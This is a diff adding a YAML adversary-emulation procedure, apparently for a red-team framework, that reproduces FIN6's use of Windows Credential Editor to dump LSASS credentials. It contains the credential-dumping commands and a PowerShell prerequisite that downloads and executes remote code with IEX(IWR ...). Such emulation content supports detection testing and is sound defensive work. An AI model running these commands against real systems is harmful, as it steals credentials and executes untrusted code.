@@ -1,0 +1,52 @@
+- id: 97412b40-4940-4da1-8bff-6f11d42bca26
+  name: WCE Credential Access
+  description: FIN6 is reported to have used WCE to access credentials on at least one occasion.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory - Windows Credential Editor (WCE)'
+  cti_source: https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf
+  procedure_group: procedure_cred_access
+  procedure_step: '3.4'
+  platforms:
+    windows:
+      cmd:
+        command: |
+          wce.exe -w -o wce_creds.txt
+        payloads:
+        - wce.exe
+        cleanup: 'del "#{output_file}" >nul 2>&1'
+  input_arguments:
+    output_file:
+      description: Path where resulting data should be placed
+      type: Path
+      default: '%temp%\wce-output.txt'
+    wce_exe:
+      description: Path of Windows Credential Editor
+      type: Path
+      default: C:\ProgramData\wce.exe
+    wce_url:
+      description: Path to download Windows Credential Editor zip file
+      type: URL
+      default: https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
+    wce_zip_hash:
+      description: File hash of the Windows Credential Editor zip file
+      type: string
+      default: 8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Windows Credential Editor must exist on disk at specified location (#{wce_exe})
+    prereq_command: if (Test-Path \#{wce_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}) {
+      Expand-Archive $zippath $parentpath\wce -Force
+      Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
+      Remove-Item $zippath, $parentpath\wce -Recurse
+      }
+  executors:
+  - name: command_prompt
+    elevation_required: true
+    command: '#{wce_exe} -o #{output_file}'
+    cleanup_command: del "#{output_file}" >nul 2>&1
